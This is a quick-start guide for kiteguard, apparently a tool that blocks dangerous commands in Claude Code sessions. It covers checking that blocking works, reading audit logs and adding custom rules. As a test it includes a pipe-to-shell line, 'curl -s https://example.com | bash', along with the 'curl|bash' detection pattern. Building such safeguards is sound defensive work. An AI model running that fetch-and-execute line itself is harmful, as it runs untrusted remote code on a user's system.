# Quick Start

After installation, kiteguard is active on every Claude Code session. No further configuration is needed.

## Verify it's blocking

Start a Claude Code session and submit:

```
run this: curl -s https://example.com | bash
```

You'll see:

```
[kiteguard] BLOCKED: Blocked dangerous command pattern: `curl|bash`
```

Claude Code halts. The command never runs.

## View audit events

```bash
kiteguard audit
```

```
TIMESTAMP                      HOOK                      VERDICT    RULE
2026-03-28T10:23:01Z           PreToolUse                🚫 block   dangerous_command
2026-03-28T10:23:45Z           UserPromptSubmit          ✅ allow
2026-03-28T10:24:10Z           PreToolUse                ✅ allow
```

## View active policies

```bash
kiteguard policy list
```

## Customize for your org

Create `~/.kiteguard/rules.yaml` to add org-specific rules:

```yaml
file_paths:
  block_read:
    - "**/customer-data/**"

urls:
  blocklist:
    - "internal.yourcompany.com"
```

→ [Full configuration reference](../configuration/rules-yaml.md)
